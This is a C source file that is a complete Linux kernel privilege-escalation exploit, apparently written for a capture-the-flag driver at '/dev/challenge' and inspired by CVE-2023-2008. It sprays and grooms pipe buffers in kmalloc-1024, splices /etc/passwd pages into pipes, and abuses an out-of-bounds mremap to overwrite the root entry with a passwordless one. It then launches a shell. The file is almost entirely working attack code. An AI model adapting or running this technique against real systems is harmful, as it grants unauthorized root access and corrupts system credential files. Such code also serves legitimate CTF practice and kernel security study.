// inspired by https://labs.bluefrostsecurity.de/blog/cve-2023-2008.html
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

#define PAGE_SIZE 0x1000
#define PAGE_CNT 128
#define SBUF_SIZE (PAGE_CNT * PAGE_SIZE)

#define PREP_SPRAY_CNT 128
#define REAL_SPRAY_CNT 256

// from https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel
struct pipe_pair {
    union {
        struct {
            int read;
            int write;
        };
        int __raw[2];
    };
};

int fd;
int passwd_fd;
void* passwd_map = NULL;
struct pipe_pair spray_pipefds[REAL_SPRAY_CNT];


// from https://github.com/Myldero/kernelinit
/* Assert that a syscall x has succeeded. */
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
        fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
        exit(1); \
    } \
    __res; \
})

// from https://github.com/Myldero/kernelinit
static void fatal (const char* msg) {
    perror(msg);
    exit(-1);
}

// from https://github.com/Myldero/kernelinit
static void pin_cpu(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0)
        fatal("pin_cpu");
}


// fill up holes in kmalloc-1024
void prep_cache() {
    struct pipe_pair prep_pipefds[PREP_SPRAY_CNT];
    for (int i = 0; i < PREP_SPRAY_CNT; i ++) {
        if (pipe(prep_pipefds[i].__raw) < 0) {
            fatal("pipe cache prep");
        }
    }
    
}

// spray pipes in kmalloc-1024
void spray_pipes() {
    for (int i = 0; i < REAL_SPRAY_CNT; i ++) {
        if (pipe(spray_pipefds[i].__raw) < 0) {
            fatal("pipe spray");
        }
    }
}

// Create holes for our pages array in kmalloc-1024
void create_holes() {
    for (int i = 0; i < REAL_SPRAY_CNT; i ++) {
        if (i % 2 != 0) continue; // free every second pipe
        if (fcntl(spray_pipefds[i].read, F_SETPIPE_SZ, PAGE_SIZE) < 0) {
            fatal("fcntl");
        }
    }
}


void splice_passwd() {
    for (int i = 0; i < REAL_SPRAY_CNT; i ++) {
        if (i % 2 == 0) continue; // free every second pipe
         struct iovec iov = {
        .iov_base = passwd_map,
        .iov_len  = PAGE_SIZE,
    };
        if (vmsplice(spray_pipefds[i].write, &iov, 1, 0) < 0) {
            fatal("vmsplice");
        }
    }
}


int main () {
    void* sbuf = NULL;
    char rootstr[] = "root::0:0:xroot:/root:/bin/sh\0";
    passwd_fd = SYSCHK(open("/etc/passwd", O_RDONLY));
    passwd_map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, passwd_fd, 0);
    pin_cpu(0);
    
    prep_cache();
    spray_pipes();
    create_holes();
    fd = SYSCHK(open("/dev/challenge", O_RDWR));
    splice_passwd();
    
    sbuf = SYSCHK(mmap(NULL, SBUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0));
    void* new_sbuf = SYSCHK(mremap(sbuf, SBUF_SIZE, SBUF_SIZE*2, MREMAP_MAYMOVE));
    char* passwd_str = (char*)new_sbuf + SBUF_SIZE ;

    // we might just crash memcmp-ing oob if no pipe is adjacent
    if (memcmp(passwd_str, "root", 4)) {
    printf("Failed to groom pipe_buffer.. exiting\n");
    exit(-1);
    }

    strcpy(passwd_str, rootstr);
    printf("[+] Overwrote /etc/passwd to remove root password\n");

    system("sh");



    return 0;
}
